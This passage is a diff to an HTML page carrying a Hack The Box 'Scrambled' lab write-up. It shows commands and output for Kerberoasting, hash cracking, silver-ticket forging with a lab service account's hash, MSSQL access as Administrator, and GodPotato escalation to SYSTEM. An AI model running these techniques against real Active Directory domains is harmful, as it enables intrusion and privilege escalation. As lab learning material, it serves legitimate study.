-</code></pre><p>BloodHound explained it. sqlsvc is a member of the NOACCESS group:</p><p><img src=/images/writeups/htb-scrambled/bloodhound-sqlsvc-noaccess-memberof.png alt="BloodHound graph showing SQLSVC@SCRM.LOCAL has a MemberOf edge to NOACCESS@SCRM.LOCAL"></p><p>That group matches what the security document described - they blocked the SQL service account from logging in directly after the previous breach.</p><p>Here&rsquo;s where the silver ticket matters. Normal Kerberos authentication has two steps: you get a TGT from the DC, then exchange it for a TGS for the specific service you want. When you present that TGS to the service, the service decrypts it using its own account&rsquo;s NT hash to verify its authenticity. The DC is only involved in the first two steps. Once the service receives the TGS, it validates it locally.</p><p>A silver ticket skips the DC entirely. If you know the service account&rsquo;s NT hash, you can forge a TGS yourself, signed as any user you want, for any SPN that account owns. The service will trust it because it decrypts correctly. The NOACCESS restriction on sqlsvc doesn&rsquo;t apply because you&rsquo;re not presenting sqlsvc&rsquo;s TGT to the DC. You&rsquo;re presenting a service ticket that claims to be from Administrator, signed with sqlsvc&rsquo;s key.</p><p>Three things needed to forge it:</p><ul><li><strong>sqlsvc&rsquo;s NT hash</strong>: NT hash is the MD4 hash of the password encoded as UTF-16LE. <code>Pegasus60</code> → <code>B999A16500B87D17EC7F2E2A68778F05</code></li><li><strong>Domain SID</strong>: from BloodHound, on the SCRM.LOCAL domain node</li></ul><p><img src=/images/writeups/htb-scrambled/bloodhound-domain-sid.png alt="BloodHound domain node for SCRM.LOCAL showing the Domain SID field highlighted: S-1-5-21-2743207045-1827831105-2542523200"></p><ul><li><strong>Target SPN</strong>: <code>MSSQLSvc/dc1.scrm.local:1433</code> from the Kerberoast output</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>KRB5_CONFIG</span><span class=o>=</span>/etc/krb5.conf ticketer.py <span class=se>\
-</span></span></span><span class=line><span class=cl>  -nthash B999A16500B87D17EC7F2E2A68778F05 <span class=se>\
-</span></span></span><span class=line><span class=cl>  -domain-sid S-1-5-21-2743207045-1827831105-2542523200 <span class=se>\
-</span></span></span><span class=line><span class=cl>  -domain scrm.local <span class=se>\
-</span></span></span><span class=line><span class=cl>  -spn MSSQLSvc/dc1.scrm.local:1433 <span class=se>\
-</span></span></span><span class=line><span class=cl>  -user-id <span class=m>500</span> <span class=se>\
-</span></span></span><span class=line><span class=cl>  Administrator
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Creating basic skeleton ticket and PAC Infos
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Customizing ticket <span class=k>for</span> scrm.local/Administrator
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Saving/Updating ticket in Administrator.ccache
-</span></span></code></pre></div><p>Then connect to MSSQL using that ticket:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>KRB5_CONFIG</span><span class=o>=</span>/etc/krb5.conf <span class=nv>KRB5CCNAME</span><span class=o>=</span>Administrator.ccache <span class=se>\
-</span></span></span><span class=line><span class=cl>  mssqlclient.py -k -no-pass <span class=se>\
-</span></span></span><span class=line><span class=cl>  -dc-ip 10.129.11.56 <span class=se>\
-</span></span></span><span class=line><span class=cl>  scrm.local/Administrator@dc1.scrm.local
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Encryption required, switching to TLS
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ACK: Result: <span class=m>1</span> - Microsoft SQL Server <span class=m>2019</span> RTM <span class=o>(</span>15.0.2000<span class=o>)</span>
-</span></span><span class=line><span class=cl>SQL <span class=o>(</span>SCRM<span class=se>\a</span>dministrator  dbo@master<span class=o>)</span>&gt;
-</span></span></code></pre></div><p>MSSQL as domain Administrator. The NOACCESS group was never consulted.</p><h2 id=shell-and-system>Shell and SYSTEM</h2><p><code>xp_cmdshell</code> was available and enabled. This is a SQL Server stored procedure that shells out to cmd.exe on the host. It&rsquo;s disabled by default but DBAs frequently re-enable it for convenience. Once you have sysadmin on MSSQL, it&rsquo;s usually the first thing to check.</p><p>Running <code>whoami</code> through xp_cmdshell shows the underlying process is <code>scrm\sqlsvc</code>, not Administrator. The ticket got me authenticated as a sysadmin, but the service itself runs as sqlsvc. Checking privileges:</p><pre tabindex=0><code>SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
-</code></pre><p>SeImpersonatePrivilege is granted to service accounts so they can act on behalf of clients they&rsquo;re servicing. The potato exploits abuse it: they trick a privileged system process into authenticating to a named pipe you control, then steal its token to spawn a process as SYSTEM. GodPotato is the current reliable implementation for Windows Server 2019.</p><p>Dropped nc.exe and GodPotato via PowerShell from a quick Python HTTP server, then:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\T</span>emp<span class=se>\g</span>p.exe -cmd <span class=s2>&#34;cmd /c whoami&#34;</span>
-</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> CurrentUser: NT AUTHORITY<span class=se>\S</span>YSTEM
-</span></span><span class=line><span class=cl>nt authority<span class=se>\s</span>ystem
-</span></span></code></pre></div><p>Got both flags from SYSTEM. The notes say &ldquo;idk what was the intended here.&rdquo; The machine probably has a more involved path through a .NET application called ScrambleClient, but the silver ticket + GodPotato route landed SYSTEM cleanly without needing it.</p><p><em>Reference: <a href=https://secured.ai/active-directory-series-silver-ticket-attack/>secured.ai - Active Directory Series: Silver Ticket Attack</a></em></p></div></article></main></div><script>function toggleToc(){const e=document.getElementById("tocContent"),t=document.querySelector(".toc-toggle");if(!e||!t)return;e.classList.toggle("expanded"),t.classList.toggle("expanded")}function toggleMiniToc(){const e=document.getElementById("miniToc");e&&e.classList.toggle("minimized")}function setupActiveHighlighting(e){const n=Array.from(e).map(e=>{const t=e.getAttribute("href");if(t&&t.startsWith("#")){const n=document.getElementById(decodeURIComponent(t.slice(1)));if(n)return{link:e,element:n}}return null}).filter(Boolean);if(n.length===0)return;function s(){const s=window.scrollY+100;let t=null;n.forEach(e=>{e.element.offsetTop<=s&&(t=e)}),e.forEach(e=>e.classList.remove("active")),t&&t.link.classList.add("active")}let t=!1;window.addEventListener("scroll",()=>{t||(requestAnimationFrame(()=>{s(),t=!1}),t=!0)}),s()}function initMiniToc(){const n=document.getElementById("miniToc"),s=document.getElementById("miniTocContent"),o=document.getElementById("tocContent");if(!n||!s||!o)return;const e=o.cloneNode(!0);e.classList.remove("toc-content","expanded"),e.removeAttribute("id");const t=e.querySelectorAll("a");if(t.length===0)return;t.forEach(e=>{e.addEventListener("click",t=>{const n=e.getAttribute("href");if(n&&n.startsWith("#")){const e=document.getElementById(decodeURIComponent(n.slice(1)));e&&(t.preventDefault(),e.scrollIntoView({behavior:"smooth",block:"start"}),history.pushState(null,"",n))}})}),s.appendChild(e),n.classList.add("visible"),setupActiveHighlighting(t)}document.addEventListener("DOMContentLoaded",initMiniToc)</script><footer class=footer><span class=footer_item></span>&nbsp;<div class=footer_social-icons><a href=https://discord.com/users/kanyo._ target=_blank rel="noopener noreferrer me" title=Discord><svg viewBox="20 15 205 190" fill="currentColor" stroke="none"><path d="M104.4 103.9c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zm36.5.0c-5.7.0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7.0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z"/><path d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2.0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6.0.0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3.0.0-8.5 14.5-30.6 15.2z"/></svg></a>
-<a href=https://github.com/Chaelsoo target=_blank rel="noopener noreferrer me" title=Github><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a>
-<a href=https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/ target=_blank rel="noopener noreferrer me" title=Linkedin><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 016 6v7h-4v-7a2 2 0 00-2-2 2 2 0 00-2 2v7h-4v-7a6 6 0 016-6z"/><rect x="2" y="9" width="4" height="12"/><circle cx="4" cy="4" r="2"/></svg></a>
-<a href=https://app.hackthebox.com/users/1490281 target=_blank rel="noopener noreferrer me" title=Hackthebox><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1 2 6.5v11L12 23l10-5.5v-11L12 1z"/><path d="M12 12 2 6.5M12 12v11m0-11 10-5.5"/></svg></a></div><small class=footer_copyright>© 2026 .
-Powered by <a href=https://github.com/hugo-sid/hugo-blog-awesome target=_blank rel=noopener>Hugo blog awesome</a>.</small></footer><a href=# title="Go to top" id=totop><svg width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960"><path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197z"/></svg>
-</a><script src=https://chaelsoo.me/js/main.min.b09c6387b2f6ee79fac79c531b410d511da72f67534abd4435676936738db1e1.js integrity="sha256-sJxjh7L27nn6x5xTG0ENUR2nL2dTSr1ENWdpNnONseE="></script></body></html>
+</code></pre><p>My local resolver also checks <code>/etc/resolv.conf</code> before <code>/etc/hosts</code>, so I prefixed every Kerberos-aware command with <code>KRB5_CONFIG=/etc/krb5.conf KRB5CCNAME=&lt;ticket&gt;.ccache</code> to force the right config.</p>
+<h2 id="kerberoasting">Kerberoasting</h2>
+<p>With a valid TGT for ksimpson, I could enumerate SPNs and request service tickets. Kerberoasting works because any authenticated domain user can ask the DC for a TGS for any registered SPN. The ticket comes back encrypted with the service account&rsquo;s NT hash. That hash never leaves the domain, but the encrypted blob you get is enough to crack offline.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">KRB5CCNAME</span><span class="o">=</span>ksimpson.ccache <span class="nv">KRB5_CONFIG</span><span class="o">=</span>/etc/krb5.conf <span class="se">\
+</span></span></span><span class="line"><span class="cl">  GetUserSPNs.py -k -no-pass <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -dc-host dc1.scrm.local -dc-ip 10.129.11.56 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  scrm.local/ksimpson -request
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ServicePrincipalName          Name    
+</span></span><span class="line"><span class="cl">----------------------------  ------  
+</span></span><span class="line"><span class="cl">MSSQLSvc/dc1.scrm.local:1433  sqlsvc            
+</span></span><span class="line"><span class="cl">MSSQLSvc/dc1.scrm.local       sqlsvc            
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>sqlsvc<span class="nv">$SCRM</span>.LOCAL$...
+</span></span></code></pre></div><p>One SPN: <code>MSSQLSvc/dc1.scrm.local:1433</code> mapped to <code>sqlsvc</code>. Threw the hash at rockyou:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">13100</span> sqlsvc.hash /usr/share/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl"><span class="nv">$krb5tgs$23$*</span>sqlsvc<span class="nv">$SCRM</span>.LOCAL$...:Pegasus60
+</span></span></code></pre></div><p><code>sqlsvc:Pegasus60</code>.</p>
+<h2 id="silver-ticket">Silver Ticket</h2>
+<p>The obvious next step is connecting to MSSQL with those credentials. Direct login fails:</p>
+<pre tabindex="0"><code>ERROR(DC1): Line 1: Login failed for user &#39;SCRM\sqlsvc&#39;.
+</code></pre><p>BloodHound explained it. sqlsvc is a member of the NOACCESS group:</p>
+<p><img src="/images/writeups/htb-scrambled/bloodhound-sqlsvc-noaccess-memberof.png" alt="BloodHound graph showing SQLSVC@SCRM.LOCAL has a MemberOf edge to NOACCESS@SCRM.LOCAL"></p>
+<p>That group matches what the security document described - they blocked the SQL service account from logging in directly after the previous breach.</p>
+<p>Here&rsquo;s where the silver ticket matters. Normal Kerberos authentication has two steps: you get a TGT from the DC, then exchange it for a TGS for the specific service you want. When you present that TGS to the service, the service decrypts it using its own account&rsquo;s NT hash to verify its authenticity. The DC is only involved in the first two steps. Once the service receives the TGS, it validates it locally.</p>
+<p>A silver ticket skips the DC entirely. If you know the service account&rsquo;s NT hash, you can forge a TGS yourself, signed as any user you want, for any SPN that account owns. The service will trust it because it decrypts correctly. The NOACCESS restriction on sqlsvc doesn&rsquo;t apply because you&rsquo;re not presenting sqlsvc&rsquo;s TGT to the DC. You&rsquo;re presenting a service ticket that claims to be from Administrator, signed with sqlsvc&rsquo;s key.</p>
+<p>Three things needed to forge it:</p>
+<ul>
+<li><strong>sqlsvc&rsquo;s NT hash</strong>: NT hash is the MD4 hash of the password encoded as UTF-16LE. <code>Pegasus60</code> → <code>B999A16500B87D17EC7F2E2A68778F05</code></li>
+<li><strong>Domain SID</strong>: from BloodHound, on the SCRM.LOCAL domain node</li>
+</ul>
+<p><img src="/images/writeups/htb-scrambled/bloodhound-domain-sid.png" alt="BloodHound domain node for SCRM.LOCAL showing the Domain SID field highlighted: S-1-5-21-2743207045-1827831105-2542523200"></p>
+<ul>
+<li><strong>Target SPN</strong>: <code>MSSQLSvc/dc1.scrm.local:1433</code> from the Kerberoast output</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">KRB5_CONFIG</span><span class="o">=</span>/etc/krb5.conf ticketer.py <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -nthash B999A16500B87D17EC7F2E2A68778F05 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain-sid S-1-5-21-2743207045-1827831105-2542523200 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -domain scrm.local <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -spn MSSQLSvc/dc1.scrm.local:1433 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -user-id <span class="m">500</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">  Administrator
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Creating basic skeleton ticket and PAC Infos
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Customizing ticket <span class="k">for</span> scrm.local/Administrator
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Saving/Updating ticket in Administrator.ccache
+</span></span></code></pre></div><p>Then connect to MSSQL using that ticket:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">KRB5_CONFIG</span><span class="o">=</span>/etc/krb5.conf <span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache <span class="se">\
+</span></span></span><span class="line"><span class="cl">  mssqlclient.py -k -no-pass <span class="se">\
+</span></span></span><span class="line"><span class="cl">  -dc-ip 10.129.11.56 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  scrm.local/Administrator@dc1.scrm.local
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Encryption required, switching to TLS
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> ACK: Result: <span class="m">1</span> - Microsoft SQL Server <span class="m">2019</span> RTM <span class="o">(</span>15.0.2000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SQL <span class="o">(</span>SCRM<span class="se">\a</span>dministrator  dbo@master<span class="o">)</span>&gt;
+</span></span></code></pre></div><p>MSSQL as domain Administrator. The NOACCESS group was never consulted.</p>
+<h2 id="shell-and-system">Shell and SYSTEM</h2>
+<p><code>xp_cmdshell</code> was available and enabled. This is a SQL Server stored procedure that shells out to cmd.exe on the host. It&rsquo;s disabled by default but DBAs frequently re-enable it for convenience. Once you have sysadmin on MSSQL, it&rsquo;s usually the first thing to check.</p>
+<p>Running <code>whoami</code> through xp_cmdshell shows the underlying process is <code>scrm\sqlsvc</code>, not Administrator. The ticket got me authenticated as a sysadmin, but the service itself runs as sqlsvc. Checking privileges:</p>
+<pre tabindex="0"><code>SeImpersonatePrivilege    Impersonate a client after authentication    Enabled
+</code></pre><p>SeImpersonatePrivilege is granted to service accounts so they can act on behalf of clients they&rsquo;re servicing. The potato exploits abuse it: they trick a privileged system process into authenticating to a named pipe you control, then steal its token to spawn a process as SYSTEM. GodPotato is the current reliable implementation for Windows Server 2019.</p>
+<p>Dropped nc.exe and GodPotato via PowerShell from a quick Python HTTP server, then:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">C:<span class="se">\T</span>emp<span class="se">\g</span>p.exe -cmd <span class="s2">&#34;cmd /c whoami&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> CurrentUser: NT AUTHORITY<span class="se">\S</span>YSTEM
+</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
+</span></span></code></pre></div><p>Got both flags from SYSTEM. The notes say &ldquo;idk what was the intended here.&rdquo; The machine probably has a more involved path through a .NET application called ScrambleClient, but the silver ticket + GodPotato route landed SYSTEM cleanly without needing it.</p>
+<p><em>Reference: <a href="https://secured.ai/active-directory-series-silver-ticket-attack/">secured.ai - Active Directory Series: Silver Ticket Attack</a></em></p>
+
+            </div>
+        </article></main>
+</div>
+
+<script>
+    function toggleToc() {
+        const content = document.getElementById('tocContent');
+        const button = document.querySelector('.toc-toggle');
+        if (!content || !button) return;
+        content.classList.toggle('expanded');
+        button.classList.toggle('expanded');
+    }
+
+    function toggleMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        if (miniToc) miniToc.classList.toggle('minimized');
+    }
+
+    function setupActiveHighlighting(links) {
+        const targets = Array.from(links).map(link => {
+            const href = link.getAttribute('href');
+            if (href && href.startsWith('#')) {
+                const el = document.getElementById(decodeURIComponent(href.slice(1)));
+                if (el) return { link, element: el };
+            }
+            return null;
+        }).filter(Boolean);
+
+        if (targets.length === 0) return;
+
+        function update() {
+            const scrollPosition = window.scrollY + 100;
+            let active = null;
+            targets.forEach(t => {
+                if (t.element.offsetTop <= scrollPosition) active = t;
+            });
+            links.forEach(l => l.classList.remove('active'));
+            if (active) active.link.classList.add('active');
+        }
+
+        let ticking = false;
+        window.addEventListener('scroll', () => {
+            if (!ticking) {
+                requestAnimationFrame(() => { update(); ticking = false; });
+                ticking = true;
+            }
+        });
+        update();
+    }
+
+    function initMiniToc() {
+        const miniToc = document.getElementById('miniToc');
+        const miniTocContent = document.getElementById('miniTocContent');
+        const sourceToc = document.getElementById('tocContent');
+        if (!miniToc || !miniTocContent || !sourceToc) return;
+
+        const clone = sourceToc.cloneNode(true);
+        clone.classList.remove('toc-content', 'expanded');
+        clone.removeAttribute('id');
+
+        const links = clone.querySelectorAll('a');
+        if (links.length === 0) return;
+
+        links.forEach(link => {
+            link.addEventListener('click', (e) => {
+                const href = link.getAttribute('href');
+                if (href && href.startsWith('#')) {
+                    const target = document.getElementById(decodeURIComponent(href.slice(1)));
+                    if (target) {
+                        e.preventDefault();
+                        target.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                        history.pushState(null, '', href);
+                    }
+                }
+            });
+        });
+
+        miniTocContent.appendChild(clone);
+        miniToc.classList.add('visible');
+        setupActiveHighlighting(links);
+    }
+
+    document.addEventListener('DOMContentLoaded', initMiniToc);
+</script>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://discord.com/users/kanyo._" target="_blank" rel="noopener noreferrer me"
+    title="Discord"><svg xmlns="http://www.w3.org/2000/svg" viewBox="20 15 205 190" fill="currentColor" stroke="none">
+    <path
+        d="M104.4 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1.1-6.1-4.5-11.1-10.2-11.1zM140.9 103.9c-5.7 0-10.2 5-10.2 11.1s4.6 11.1 10.2 11.1c5.7 0 10.2-5 10.2-11.1s-4.5-11.1-10.2-11.1z" />
+    <path
+        d="M189.5 20h-134C44.2 20 35 29.2 35 40.6v135.2c0 11.4 9.2 20.6 20.5 20.6h113.4l-5.3-18.5 12.8 11.9 12.1 11.2 21.5 19V40.6c0-11.4-9.2-20.6-20.5-20.6zm-38.6 130.6s-3.6-4.3-6.6-8.1c13.1-3.7 18.1-11.9 18.1-11.9-4.1 2.7-8 4.6-11.5 5.9-5 2.1-9.8 3.5-14.5 4.3-9.6 1.8-18.4 1.3-25.9-.1-5.7-1.1-10.6-2.7-14.7-4.3-2.3-.9-4.8-2-7.3-3.4-.3-.2-.6-.3-.9-.5-.2-.1-.3-.2-.4-.3-1.8-1-2.8-1.7-2.8-1.7s4.8 8 17.5 11.8c-3 3.8-6.7 8.3-6.7 8.3-22.1-.7-30.5-15.2-30.5-15.2 0-32.2 14.4-58.3 14.4-58.3 14.4-10.8 28.1-10.5 28.1-10.5l1 1.2c-18 5.2-26.3 13.1-26.3 13.1s2.2-1.2 5.9-2.9c10.7-4.7 19.2-6 22.7-6.3.6-.1 1.1-.2 1.7-.2 6.1-.8 13-1 20.2-.2 9.5 1.1 19.7 3.9 30.1 9.6 0 0-7.9-7.5-24.9-12.7l1.4-1.6s13.7-.3 28.1 10.5c0 0 14.4 26.1 14.4 58.3 0 0-8.5 14.5-30.6 15.2z" />
+</svg></a>
+<a href="https://github.com/Chaelsoo" target="_blank" rel="noopener noreferrer me"
+    title="Github"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg></a>
+<a href="https://www.linkedin.com/in/abderrahmen-dellaa-a78517249/" target="_blank" rel="noopener noreferrer me"
+    title="Linkedin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path>
+    <rect x="2" y="9" width="4" height="12"></rect>
+    <circle cx="4" cy="4" r="2"></circle>
+</svg></a>
+<a href="https://app.hackthebox.com/users/1490281" target="_blank" rel="noopener noreferrer me"
+    title="Hackthebox"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M12 1L2 6.5v11L12 23l10-5.5v-11L12 1z"></path><path d="M12 12L2 6.5M12 12v11M12 12l10-5.5"></path></svg></a>
+</div>
+    <small class="footer_copyright">
+        © 2026 .
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+
+
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js"></script>
+
+    
+
+</body>
+</html>
